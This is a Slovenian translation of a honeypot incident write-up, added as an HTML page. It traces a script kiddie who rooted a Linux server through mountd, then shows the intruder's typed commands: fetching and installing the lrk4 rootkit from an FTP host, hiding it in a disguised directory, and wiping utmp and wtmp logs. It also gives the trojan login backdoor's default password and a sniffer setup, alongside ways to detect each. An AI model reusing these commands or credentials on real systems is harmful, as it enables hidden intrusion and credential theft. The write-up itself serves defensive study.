@@ -1,0 +1,169 @@
+<html>
+<head>
+	<title>Poznajte Svojega Sovražnika: III</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
+<meta http-equiv="Content-Language" content="sl">
+</head>
+
+<body bgcolor="#ffffff" text="#000000">
+<font face="verdana" size=2><i>
+Nepridipravi dobijo koreninski dostop<br></i><font size=6>
+<br><b>
+Poznajte Svojega Sovražnika: III<br></font></b>
+<br>
+<br>
+<a href="mailto:lance@spitzner.net">Lance Spitzner</a><br>
+Zadnjič spremenjeno: 27.03.2000<br>
+<br><B>
+Ta članek je tretji del serije o script kiddie-ih. <a href="pss1.html">Prvi del</A> opisuje kaj script kiddie-i iščejo ter kako izbrabijo varnostne luknje v sistemu, <a href="pss2.html">drugi del</A> opisuje kako lahko zaznamo poskuse vdora, jih identificiramo in ugotovimo katera orodja so bila uporabljena ter katere ranljivosti so poskusila izkoriščati. Tretji del pa opisuje kaj se dogaja, ko vdiralec dobi koreninski dostop do računalnika. Bolj natančneje, kako zakrijejo svoje sledi in kaj naredijo nato. Vse te podatke si lahko v tekstovni obliki presnamete <a href="honeypot.tar.gz">tukaj</A>. <br>
+<br><font size=4></b>
+Kdo je script kiddie?<br></font>
+<BR>
+<br>
+Kot smo spoznali v prvem delu, script kiddie niti ni oseba, temveč strategija, kako čimhitreje ter čimlažje vdreti v sistem. Ne išče specifičnih informacij o kakšnem podjetju, ampak hoče dobiti koreninski dostop na čimveč računalnikih po svetu čimhitreje. Vdiralci to počnejo z relativno majhnim številom znanih exploitov in preiskujejo celoten Internet za določen exploit. Ne podcenjujte te strategije, saj jim prej ali slej gotovo uspe. <br>
+<br>
+Ko enkrat najdejo ranljivi sistem in pridobijo pravice koreninskega uporabnika, je navadno prva stvar, ki jo naredijo zakritje sledi. Zagotoviti si hočejo varen dom, in neodkriljivost s tem, da se njihova dejanja ne kažejo v nobenemu od dnevnikov ter procesov. Naslednja stvar, je preiskovanje celotneta Interneta za naslednje ranljivosti iz vašega strežnika, saj je tako varen pred oblastjo, ali pa pritajeno spremljanje vaših dejanj. Da bi bolje razumeli, kako dosežejo te cilje si bomo po korakih ogledali strežnik, v katerega je vdrl nek script kiddie. Naš sistem, imenovan mozart, je Linux strežnik z RedHat 5.1 distribucijo. Strežnik je bil zavzet 27.04.2000. Dejanja script kiddie-a navedena spodaj so resnična, prav tako sistemski dnevniki ter vse, kar je script kiddie natipkal. Vsi sistemski dnevniki so bili zabeleženi na posebnem, dobro zaščitenem dnevniškem strežniku, vse, kar je vdiralec natipkal pa je bilo prestreženo z vohljačem <a href="ftp://ftp.technotronic.com/unix/network-sniffers/">sniffit</A>. Za več informacij o tem, kako so bile vse te informacije prestrežene, si oglejte <a href="honeypot.html">Kako izdelati honeypot</A>. Skozi celoten dokument je vdiralec obravnavan kot on, čeprav ne vemo katerega spola je. <br>
+<br><font size=4>
+Exploit<br></font>
+<br>
+<BR>
+27.04.2000 ob 00:13 h, je bil naš sistem skeniran od sistema 1Cust174.tnt2.long-branch.nj.da.uu.net za nekaj ranljivosti, vključno z IMAP ranljivostjo. Naš vdiralec je prišel zelo glasno, saj je bil vsak računalnik v omrežju skeniran (za več informacij o zaznavanju ter analiziranju skeniranj si oglejte <a href="pss2.html">drugi del</a> serije).<br>
+<br><FONT face="Courier New,Courier" size=-1>
+Apr 27 00:12:25 mozart imapd[939]: connect from 208.252.226.174 <br>
+Apr 27 00:12:27 bach imapd[1190]: connect from 208.252.226.174 <br>
+Apr 27 00:12:30 vivaldi imapd[1225]: connect from 208.252.226.174 <br>
+<BR></font>
+Očitno je našel nekaj, kar bi rad in je zato prišel nazaj ob 06:52 in ob 16:47 isti dan. Začel je z temeljitejšim skeniranjem vendar se je tokrat osredotočil le na mozart-a. Našel je luknjo ter izvedel uspešen napad na mountd, dobro znano luknjo v sistemu RedHat 5.1. Tukaj lahko vidimo, kako je vdiralec pridobil pravice koreninskega uporabnika. Najverjetneje je uporabil orodje<a href="ftp://adm.freelsd.net/pub/ADM"> ADMmountd.c</A>, ali nekaj podobnega. <br>
+<br><FONT face="Courier New,Courier" size=-1>
+Apr 27 16:47:28 mozart mountd[306]: Unauthorized access by NFS client 208.252.226.174. <br>
+Apr 27 16:47:28 mozart syslogd: Cannot glue message parts together <br>
+Apr 27 16:47:28 mozart mountd[306]: Blocked attempt of 208.252.226.174 to mount <br>
+~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P <br>
+~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~P~ <br>
+<BR></font>
+Takoj za tem napadom vidimo v /var/log/messages, da je naš obiskovalec pridobil privilegije koreninskega uporabnika s telnetanjem kot uporabnik "crak0" in nato spremembo uporabniškega imena v "rewt", ki ima UID=0 (koreninski uporabnik). Obe omenjeni uporabniški imeni sta bili dodani z programom, ki ga je vdiralec uporabil pri vdoru. Sedaj ima naš vdiralec popolno oblast nad našim sistemom. <br>
+<br><FONT face="Courier New,Courier" size=-1>
+Apr 27 16:50:27 mozart login[1233]: FAILED LOGIN 2 FROM 1Cust102.tnt1.long-branch.nj.da.uu.net FOR crak, User not known to the underlying authentication module <br>
+Apr 27 16:50:38 mozart PAM_pwdb[1233]: (login) session opened for user crak0 by (uid=0) <br>
+Apr 27 16:50:38 mozart login[1233]: LOGIN ON ttyp0 BY crak0 FROM 1Cust102.tnt1.long-branch.nj.da.uu.net <br>
+Apr 27 16:50:47 mozart PAM_pwdb[1247]: (su) session opened for user rewt by crak0(uid=0) <br><BR></font>
+<font size=4>
+Brisanje sledi<br></FONT>
+<br>
+<BR>
+Vdiralec je sedaj v sistemu kot koreninski uporabnik. Najprej si zagotovi, da ga ne bo nihče ujel, zato pogleda, če je sam na sistemu:<br>
+<br><FONT face="Courier New,Courier" size=-1>
+[crak0@mozart /tmp]$ w <br>
+  4:48pm  up 1 day, 18:27,  1 user,  load average: 0.00, 0.00, 0.00 <br>
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT <br>
+crak0    ttyp0    1Cust102.tnt1.lo  4:48pm  0.00s  0.23s  0.04s  w <br>
+<BR></font>
+Ko je ugotovil, da je zrak čist, bo hotel skriti vsa svoja dejanja. Zaradi tega sledi brisanje vsakršnega dokaza iz dnevnikov in nadomestitev sistemskih programov, kot sta ps ali netstat s svojimi trojanskimi konji, tako da vdiralca ni moč opaziti na sistemu. Ko so trojanski konji (v nadaljevanju trojani) nameščeni, je vdiralec dobil popolno kontrolo nad sistemom, zato ga verjetno nikoli ne boste razkrinkali. Kot so avtomatizirana orodja za vdiranje, tako so tudi avtizirana orodja za brisanje sledi, imenovana rootkits (oprema koreninskega uporabnika). Eden najpogostejših rootkit-ov je <a href="ftp://ftp.technotronic.com/unix/trojans">lrk4</A>. Ko skript poženemo, nam zamenja vrsto najpomembnejših sistemskih datotek, tako da skrijejo vdiralca v trenutku. Za več informacij o rootkit-ih, glejte <a href="README.txt">README</a>, ki pride zraven lrk4-e. Tako boste bolje seznanjeni z delovanjem rootkit-ov nasploh. Priporočam tudi, da si ogledate <a href="hide-n-seek.html">Skrij in išči</A>, dokument, ki opisuje brisanje sledi.<br>
+<br>
+Nekaj minut od vdora v sistem, vidimo, kako vdiralec presnemuje rootkit in ga pripravi z ukazom "make install". Spodaj so dejanske poteze, ki jih je vdiralec naredil, da bi se skril.<br>
+<br><FONT face="Courier New,Courier" size=-1>
+cd /dev/ <br>
+su rewt <br>
+mkdir ". " <br>
+cd ". " <br>
+ftp technotronic.com <br>
+anonymous <br>
+fdfsfdsdfssd@aol.com <br>
+cd /unix/trojans <br>
+get lrk4.unshad.tar.gz <br>
+quit <br>
+ls <br>
+tar -zxvf lrk4.unshad.tar.gz <br>
+mv lrk4 proc <br>
+mv proc ". " <br>
+cd ". " <br>
+ls <br>
+make install <br>
+<BR></font>
+Opazite lahko, da je vdiralec najprej naredil skrito mapo z imenom ".  ", kamor bo skril rootkit. Ta mapa se nam ne izpiše z izvedbo ukaza "ls", in izgleda kot lokalna mapa z ukazom "ls -la". En način, kako poiskati tako mapo je uporaba ukaza "find" (bodite prepričani, da je "find" program originalen, in ne trojan!).<br>
+<br><FONT face="Courier New,Courier" size=-1>
+mozart #find / -depth -name "*.*" <br>
+/var/lib/news/.news.daily <br>
+/var/spool/at/.SEQ <br>
+/dev/. /. /procps-1.01/proc/.depend <br>
+/dev/. /. <br>
+/dev/. <br>
+
+<BR></font>
+Vdiralec je lahko zelo prefinjen pri uporabi trojanov, ampak naš je imel zelo enostaven pristop k čiščenju dnevnikov. Namesto uporabe programov kot so zap2 ali clean, je kopiral /dev/null v datoteke /var/run/utmp in /var/log/utmp ter pobrisal /var/log/wtmp. Če dobite naslednjo napako, potem lahko sumite, da je nekaj narobe:<br>
+<br><FONT face="Courier New,Courier" size=-1>
+[root@mozart sbin]# last -10 <br>
+last: /var/log/wtmp: No such file or directory <br>
+Perhaps this file was removed by the operator to prevent logging last info. <br></font>
+<font size=4>
+<BR>
+Naslednji korak<br></font>
+<br>
+<BR>
+Ko vdiralec vdre v sistem, namerava narediti eno od dveh stvari. Najprej, uporabijo vaš sistem kot odskočno desko in skenirajo ali vdirajo v druge sisteme. Druga stvar pa je, da se potuhnejo ter vidijo kaj lahko izvejo (recimo uporabniška imena za druge sisteme). Naš vdiralec se je odločil za drugo varianto. Nastavil si je sniffer, ki bi prestregal ves promet v našem omrežju, vključno z telnet in ftp sejami. Tako bi izvedel druga uporabniška imena ter gesla. Kmalu po vdoru vidimo, da je začel naš strežnik delovati v "promiscuous" načinu (da prestrega ves promet iz omrežja):<br>
+<br><FONT face="Courier New,Courier" size=-1>
+Apr 27 17:03:38 mozart kernel: eth0: Setting promiscuous mode. <br>
+Apr 27 17:03:43 mozart kernel: eth0: Setting promiscuous mode. <br>
+<BR></font>
+Po namestitvi trojanov, čiščenju dnevnikov in zagonu snifferja, je naš prijatelj prekinil povezavo s strežnikom. Naslednji dan bomo videli, da bo prišel pogledat nazaj, če je "ujel" kaj koristnega. <br>
+<br><font size=4>
+Nadzor škode<br></font>
+<br>
+<BR>
+Ko je naš prijatelj prekinil povezavo, mi je dal priložnost, da pregledam sistem in natančno ugotovim, kaj se je zgodilo. Zelo me je zanimalo, kaj je bilo spremenjenega in kje so se beležile informacije, ki jih je prestregal sniffer. Najprej sem s programom <a href="ftp://coast.cs.purdue.edu/pub/COAST/Tripwire/">tripwire</a> pregledal, katere datoteke in mape so bile spremenjene. Prepričajte se, da je tripwire pristen. Jaz navadno poganjam statično-povezano (statically linked) različico tripwire-a iz read-only diskete. Tripwire je pokazal naslednje: <br>
+<br><FONT face="Courier New,Courier" size=-1>
+added:   -rw-r--r-- root            5 Apr 27 17:01:16 1999 /usr/sbin/sniff.pid <br>
+added:   -rw-r--r-- root          272 Apr 27 17:18:09 1999 /usr/sbin/tcp.log <br>
+changed: -rws--x--x root        15588 Jun  1 05:49:22 1998 /bin/login <br>
+changed: drwxr-xr-x root        20480 Apr 10 14:44:37 1999 /usr/bin <br>
+changed: -rwxr-xr-x root        52984 Jun 10 04:49:22 1998 /usr/bin/find <br>
+changed: -r-sr-sr-x root       126600 Apr 27 11:29:18 1998 /usr/bin/passwd <br>
+changed: -r-xr-xr-x root        47604 Jun  3 16:31:57 1998 /usr/bin/top <br>
+changed: -r-xr-xr-x root         9712 May  1 01:04:46 1998 /usr/bin/killall <br>
+changed: -rws--s--x root       116352 Jun  1 20:25:47 1998 /usr/bin/chfn <br>
+changed: -rws--s--x root       115828 Jun  1 20:25:47 1998 /usr/bin/chsh <br>
+changed: drwxr-xr-x root         4096 Apr 27 17:01:16 1999 /usr/sbin <br>
+changed: -rwxr-xr-x root       137820 Jun  5 09:35:06 1998 /usr/sbin/inetd <br>
+changed: -rwxr-xr-x root         7229 Nov 26 00:02:19 1998 /usr/sbin/rpc.nfsd <br>
+changed: -rwxr-xr-x root       170460 Apr 24 00:02:19 1998 /usr/sbin/in.rshd <br>
+changed: -rwxr-x--- root       235516 Apr  4 22:11:56 1999 /usr/sbin/syslogd <br>
+changed: -rwxr-xr-x root        14140 Jun 30 14:56:36 1998 /usr/sbin/tcpd <br>
+changed: drwxr-xr-x root         2048 Apr  4 16:52:55 1999 /sbin <br>
+changed: -rwxr-xr-x root        19840 Jul  9 17:56:10 1998 /sbin/ifconfig <br>
+changed: -rw-r--r-- root          649 Apr 27 16:59:54 1999 /etc/passwd <br>
+<BR></font>
+Kot lahko vidite, je bila vrsta programov spremenjena. Novih vnosov v /etc/passwd ni bilo (pametno je pobrisal uporabniški imeni crak0 in rewt), torej je naš uporabnik pustil backdoor (zadnja vrata) v enem izmed spremenjenih sistemskih datotek. Prav tako sta bili dodani dve datoteki: /usr/sbin/sniff.pid ter /usr/sbin/tcp.log. V datoteki /usr/sbin/sniff.pid je bila zapisana PID (Process ID) številka programa, v /usr/sbin/tcp.log pa so se shranjevale vse prestrežene informacije. Glede na PID številko v /usr/sbin/sniff.pid, je bil sniffer pognan pod imenom rpc.nfsd (Network Filesystem Daemon). Naš obiskovalec je prevedel snifferja, v našem primeru je bil to linsniffer in nadomestil rpc.nfsd z njim. To bi zagotovilo, da če bi bil sistem ponovno zagnan, bi se sniffer ponovno vklopil z init procesom. Strings potrjuje, da je rpc.nfsd sniffer. <br>
+<br><FONT face="Courier New,Courier" size=-1>
+mozart #strings /usr/sbin/rpc.nfsd | tail -15 <br>
+cant get SOCK_PACKET socket <br>
+cant get flags <br>
+cant set promiscuous mode <br>
+----- [CAPLEN Exceeded] <br>
+----- [Timed Out] <br>
+----- [RST] <br>
+----- [FIN] <br>
+%s =&gt; <br>
+%s [%d] <br>
+sniff.pid <br>
+eth0 <br>
+tcp.log <br>
+cant open log <br>
+rm %s <br><BR></font>
+<font size=4>
+Script kiddie se vrne<br></font>
+<br>
+<BR>
+Naslednji dan se je naš prijatelj vrnil. Z beleženjem njegovega tipkanja sem hitro prepoznal backdoor. Bil je trojanski konj namesto /bin/login programa. Ta program, ki se uporablja za telnet seje, je bil konfiguriran tako, da je dovolil uporabniku "rewt" koreninske privilegije z geslom "satori". Geslo "satori" je privzeto geslo za vse trojane, ki jih uporablja rootkit lrk4.<br>
+<br>
+Vdiralec je preveril njegov sniffer, da bi ugotovil, če še deluje. Prav tako je želel ugotoviti, če je ujel kakšno uporabniško ime v preteklem dnevu. Njegov dnevnik tipkanja si lahko ogledate v datoteki <a href="keystrokes.txt">keystrokes.txt</A>. Kot lahko vidite, na koncu dnevnika naš obiskovalec izklopi snifferja. To je bilo zadnje dejanje, preden se je odklopil od sistema. Čez nekaj minut se je vrnil, ter ga ponovno pognal. Nisem prav gotov, zakaj je to storil.<br>
+<br>
+Proces preverjanja sistema se je nadaljeval nekaj dni. Vsak dan je vdiralec preveril, če njegov sniffer še deluje ter če je že ujel kakšno pomembno informacijo. Po četrtem dnevu sem se odločil, da je dovolj ter odklopil sistem iz Interneta. Dovolj sem izvedel o vdiralčevih dejanjih in tako ali tako se ne bi naučil nič več novega. <br>
+<br><font size=4>
+Povzetek<br></FONT>
+<br>
+<BR>
+V tem delu smo videli, kako se navadno vdiralec obnaša, od začetka do konca, ko dobi koreninske privilegije na sistemu. Pogosto začnejo s pregledovanjem trenutnih odprtih sej na računalniku. Ko vidijo, da je zrak čist, zabrišejo svoje sledi z čiščenjem dnevnikov in zamenjavo pomembnih sistemskih datotek. Ko so varno skriti, začnejo z novimi in bolj škodljivimi dejanji. Taka taktika se bo obdržala, saj se nove ranljivosti konstantno odkrivajo. Najboljši način, da se obvarujemo pred temi nevarnostmi je, da "oborožimo" svoj sistem. Osnovna oborožitev nas bo obvarovala pred večino script kiddie-vskih nevarnostmi, saj le-ti hočejo enostavno ter hitro vdreti v sistem. Za več informacij o oboroževanju sistemov, si oglejte spise <a href="arm_lin.html">Oboroževanje Linuxa</A> ali <a href="arm_sol.html">Oboroževanje Solarisa</A>. Če mislite, da je prepozno in da je vaš računalnik že bil zavzet, je najbolje začeti pri CERTovi strani <a href="http://www.cert.org/nav/recovering.html">Recovering from an Incident</A>. <br>
+<br>
+
+</body>
+</html>
